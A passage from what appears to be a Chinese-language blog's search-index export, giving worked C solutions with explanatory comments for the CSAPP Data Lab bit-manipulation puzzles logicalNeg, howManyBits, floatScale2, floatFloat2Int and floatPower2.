class="hljs-type">int</span> a = flag_not_same &amp; x_flag;<br>  <span class="hljs-comment">// 如果符号相同，并且差值为负，即b=1，即flag_same=0,sub_flag=1;</span><br>  <span class="hljs-type">int</span> b = !(flag_not_same | (!sub_flag));<br>  <span class="hljs-comment">// 如果两个数相同，则c为1，否则c为0</span><br>  <span class="hljs-type">int</span> c = !(x ^ y);<br>  <span class="hljs-keyword">return</span> a | b | c;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h1><p>思路</p><ol><li>对于0，返回1，对于非0的数，返回0</li><li>其实只需要对确定x是0后返回1，其他情况都是返回0</li><li>做法很tricky<ol><li>首先，对于任何符号位为0的数，加上Tmax之后，只有0不会导致溢出为负数。</li><li>因此只需要满足下面两个条件就可以返回1，否则返回0<ol><li>x的符号位是0</li><li>x+Tmax之后的符号位也是0</li></ol></li></ol></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * logicalNeg - implement the ! operator, using all of</span><br><span class="hljs-comment"> *              the legal operators except !</span><br><span class="hljs-comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">logicalNeg</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-comment">// 先得到最大的32位有符号数</span><br>  <span class="hljs-type">int</span> T_max = ~(<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>);<br>  <span class="hljs-comment">// 得到x的符号</span><br>  <span class="hljs-type">int</span> x_sign = x &gt;&gt; <span class="hljs-number">31</span> &amp; <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">// 将x和T_max相加，除了0，其他的数加上去之后一定是一个负数</span><br>  <span class="hljs-type">int</span> a = x + T_max;<br>  <span class="hljs-type">int</span> a_sign = a &gt;&gt; <span class="hljs-number">31</span> &amp; <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">// 只有当x和a的sign都是0时，才返回1，否则返回0</span><br>  <span class="hljs-keyword">return</span> (x_sign ^ <span class="hljs-number">1</span>) &amp; (a_sign ^ <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h1><p>思路</p><ol><li>如果用补码来表示x，最少需要多少位？</li><li>首先对于正数，符号位一定是0，因此只需要找到最高位的1</li><li>其次对于负数，符号位一定是1，需要找到最高位的0，因为高位连续多个1其实就相当于一个1。为了方便起见，将负数取反，那么就和正数一样变成求最高位的1的问题。</li><li>如何求最高位的1？使用二分的思想<ol><li>首先判断高16位是否全0<ol><li>如果不是全0，那么低16位肯定是需要的，将16加到答案里去，再右移16位，接下来再去处理高16位</li><li>如果是全0，那么低16不一定需要，不用加到答案里去。接下来继续处理低16位</li></ol></li><li>接下来就是判断当前的8位。<ol><li>注意了，这里的8位有可能是原来的八位，也有可能是高16位经过右移之后变成了新的低16位的八位！</li></ol></li><li>然后就是不断的二分下去，直到只剩下一位</li><li>如果这一位是1，说明还需要1位。如果为0，则说明这一位不需要了。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* howManyBits - return the minimum number of bits required to represent x in</span><br><span class="hljs-comment"> *             two&#x27;s complement</span><br><span class="hljs-comment"> *  Examples: howManyBits(12) = 5</span><br><span class="hljs-comment"> *            howManyBits(298) = 10</span><br><span class="hljs-comment"> *            howManyBits(-5) = 4</span><br><span class="hljs-comment"> *            howManyBits(0)  = 1</span><br><span class="hljs-comment"> *            howManyBits(-1) = 1</span><br><span class="hljs-comment"> *            howManyBits(0x80000000) = 32</span><br><span class="hljs-comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *  Max ops: 90</span><br><span class="hljs-comment"> *  Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">howManyBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-comment">// 如果是正数，那么直接求x的最高位1，如果是负数，则是要求最高位的0</span><br>  <span class="hljs-comment">// 假设这个最高位为第x位，则答案案为x+1位，因为正数需要加上符号0，负数需要加上符号1</span><br>  <span class="hljs-comment">// 对于负数，先预处理，将所有的1变成0，所有的0变成1</span><br>  <span class="hljs-comment">// 如果x为正数，则help为0，如果x为负数，则help为0xffffffff</span><br>  <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">int</span> help = x &gt;&gt; <span class="hljs-number">31</span>;<br>  <span class="hljs-comment">// 通过help将x的1变成0,0变成1。若help为0，则x不变，若help为全1，则完成转换的任务</span><br>  x = x ^ help;<br>  <span class="hljs-comment">// 下面就统一为了计算最高位的1所在的位置</span><br>  <span class="hljs-comment">// 如果高16位不为0，则has_high_16为1，否则为0</span><br>  <span class="hljs-type">int</span> has_high_16 = !!(x &gt;&gt; <span class="hljs-number">16</span>);<br>  <span class="hljs-comment">// 如果高16位存在，即has_high_16为1，那么说明低16位肯定跑不掉了，正好就是has_high_16&lt;&lt;4</span><br>  <span class="hljs-comment">// 如果高16位不存在，has_high_16为0，低16位就不一定都要，此时左移4位正好是0</span><br>  <span class="hljs-type">int</span> add_bits = has_high_16 &lt;&lt; <span class="hljs-number">4</span>;<br>  ans += add_bits;<br>  <span class="hljs-comment">// 又是一个很巧妙的操作，如果add_bits不为0，说明低16位肯定是需要的，那么就不用管低16位，直接移位</span><br>  <span class="hljs-comment">// 如果add__bits为0，说明高16位肯定不需要，低16位可能需要，那么此时右移0位，接下来正常处理低16位</span><br>  x &gt;&gt;= add_bits;<br><br>  <span class="hljs-type">int</span> has_high_8 = !!(x &gt;&gt; <span class="hljs-number">8</span>);<br>  add_bits = has_high_8 &lt;&lt; <span class="hljs-number">3</span>;<br>  ans += add_bits;<br>  x &gt;&gt;= add_bits;<br><br>  <span class="hljs-type">int</span> has_high_4 = !!(x &gt;&gt; <span class="hljs-number">4</span>);<br>  add_bits = has_high_4 &lt;&lt; <span class="hljs-number">2</span>;<br>  ans += add_bits;<br>  x &gt;&gt;= add_bits;<br><br>  <span class="hljs-type">int</span> has_high_2 = !!(x &gt;&gt; <span class="hljs-number">2</span>);<br>  add_bits = has_high_2 &lt;&lt; <span class="hljs-number">1</span>;<br>  ans += add_bits;<br>  x &gt;&gt;= add_bits;<br><br>  <span class="hljs-type">int</span> has_high_1 = !!(x &gt;&gt; <span class="hljs-number">1</span>);<br>  add_bits = has_high_1 &lt;&lt; <span class="hljs-number">0</span>;<br>  ans += add_bits;<br>  x &gt;&gt;= add_bits;<br><br>  <span class="hljs-comment">// x可能现在是1</span><br>  ans += x;<br><br>  <span class="hljs-keyword">return</span> ans + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><h1 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h1><p>思路</p><ol><li>将一个浮点数乘2，这个浮点数以无符号整数的形式给出</li><li>uf是NaN一类指数为11111111的，直接返回</li><li>uf是非规格化数，直接将小数部分乘2</li><li>uf是规格化数，将指数加1就可以完成乘2的效果了<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representation of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">floatScale2</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br>  <span class="hljs-comment">// 分别取出符号，指数，以及有效数位，</span><br>  <span class="hljs-comment">// 其中有效的取出比较tricky，是对sign和e的对应位置进行异或，即将高9位都置为0，剩下的就是有效数位了</span><br>  <span class="hljs-type">unsigned</span> sign = (uf &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>;<br>  <span class="hljs-type">unsigned</span> e = (uf &gt;&gt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0xff</span>;<br>  <span class="hljs-type">unsigned</span> f = uf ^ (sign &lt;&lt; <span class="hljs-number">31</span>) ^ (e &lt;&lt; <span class="hljs-number">23</span>);<br>  <span class="hljs-comment">// 如果uf为NaN等特殊值，即指数为全1，直接返回这个特殊值本身</span><br>  <span class="hljs-keyword">if</span> (!(e ^ <span class="hljs-number">0xff</span>)) &#123;<br>    <span class="hljs-keyword">return</span> uf;<br>  &#125;<br>  <span class="hljs-comment">// 如果uf为非规格化的数，即指数为0，直接将f*2即可</span><br>  <span class="hljs-comment">// 这里感觉有点问题，如果这个非规格数*2后达到了规格数的范围了，是不是要额外处理？</span><br>  <span class="hljs-keyword">if</span> (!e) &#123;<br>    <span class="hljs-keyword">return</span> (sign &lt;&lt; <span class="hljs-number">31</span>) | (f &lt;&lt; <span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-comment">// 如果uf为规格化的数</span><br>  <span class="hljs-keyword">return</span> (sign &lt;&lt; <span class="hljs-number">31</span>) | ((e + <span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-number">23</span>) | (f);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h1><p>思路</p><ol><li>将浮点数转为整数</li><li>如果这个浮点数超出了int的范围，直接返回0x80000000</li><li>如果这个浮点数的阶数小于0，说明还需要将小数部分除一个2的倍数，在int里肯定直接化为0了，因此直接返回0</li><li>否则的话，按具体情况对小数部分进行移位运算<ol><li>这里虽然叫小数部分，但是其实因为这个float类型的变量是用int类型给出的，因此这里的小数部分已经是默认左移23位的了。需要考虑这个因素。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span><br><span class="hljs-comment"> *   for floating point argument f.</span><br><span class="hljs-comment"> *   Argument is passed as unsigned int, but</span><br><span class="hljs-comment"> *   it is to be interpreted as the bit-level representation of a</span><br><span class="hljs-comment"> *   single-precision floating point value.</span><br><span class="hljs-comment"> *   Anything out of range (including NaN and infinity) should return</span><br><span class="hljs-comment"> *   0x80000000u.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">floatFloat2Int</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> &#123;<br>  <span class="hljs-comment">// 分别取出符号，指数，以及有效数位，</span><br>  <span class="hljs-comment">// 其中有效位的取出比较tricky，是对sign和e的对应位置进行异或，即将高9位都置为0，剩下的就是有效数位了</span><br>  <span class="hljs-type">unsigned</span> sign = (uf &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">1</span>;<br>  <span class="hljs-type">unsigned</span> e = (uf &gt;&gt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0xff</span>;<br>  <span class="hljs-type">unsigned</span> f = uf ^ (sign &lt;&lt; <span class="hljs-number">31</span>) ^ (e &lt;&lt; <span class="hljs-number">23</span>);<br>  <span class="hljs-comment">// 如果指数大于等于31了，因为要返回的值是int类型，1&lt;&lt;31位直接爆int了，所以返回0x80000000u</span><br>  <span class="hljs-type">int</span> E = e - <span class="hljs-number">127</span>;<br>  <span class="hljs-keyword">if</span> (E &gt;= <span class="hljs-number">31</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0x80000000</span>;<br>  &#125;<br>  <span class="hljs-comment">// 如果指数小于0了，那么肯定是返回0，因为需要对小数部分除2，那么对int来说，就是0</span><br>  <span class="hljs-keyword">if</span> (E &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-comment">// 真正的小数部分，是有一个隐藏的1在最前面的，这里不用考虑非规格化数，因为它已经在前面的E&lt;0里给淘汰了</span><br>  <span class="hljs-type">int</span> frac = f | <span class="hljs-number">0x800000</span>;<br>  <span class="hljs-comment">// 这个小数部分是用整数来表示的，即默认左移了23位，那么当前的移位应该减去23</span><br>  <span class="hljs-type">int</span> real_f = (E &gt; <span class="hljs-number">23</span>) ? (frac &lt;&lt; (E - <span class="hljs-number">23</span>)) : (frac &gt;&gt; (<span class="hljs-number">23</span> - E));<br>  <span class="hljs-keyword">return</span> sign ? -real_f : real_f;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><h1 id="floatPower2"><a href="#floatPower2" class="headerlink" title="floatPower2"></a>floatPower2</h1><p>思路</p><ol><li>将$2^x$用浮点数表示</li><li>符号位和小数部分一定是纯0，因此只需要考虑阶码</li><li>如果阶码小于等于0，直接return 0</li><li>如果阶码超过了0xff，return INF，即0x7f800000</li><li>如果正常的话，直接将阶码左移23位就得到这个浮点数了<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span><br><span class="hljs-comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   The unsigned value that is returned should have the identical bit</span><br><span class="hljs-comment"> *   representation as the single-precision floating-point number 2.0^x.</span><br><span class="hljs-comment"> *   If the result is too small to be represented as a denorm, return</span><br><span class="hljs-comment"> *   0. If too large, return +INF.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">floatPower2</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>  <span class="hljs-comment">// 得到阶码</span><br>  <span class="hljs-type">int</span> e = x + <span class="hljs-number">127</span>;<br>  <span class="hljs-comment">// 非规格数，直接返回0</span><br>  <span class="hljs-keyword">if</span> (e &lt;= <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-comment">// 无穷</span><br>  <span class="hljs-keyword">if</span> (e &gt;= <span class="hljs-number">0xff</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0x7f800000</span>;<br>  &#125;<br>  <span class="hljs-comment">// 规格数，符号位0，小数部分也是0</span><br>  <span class="hljs-keyword">return</span> e &lt;&lt; <span class="hljs-number">23</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
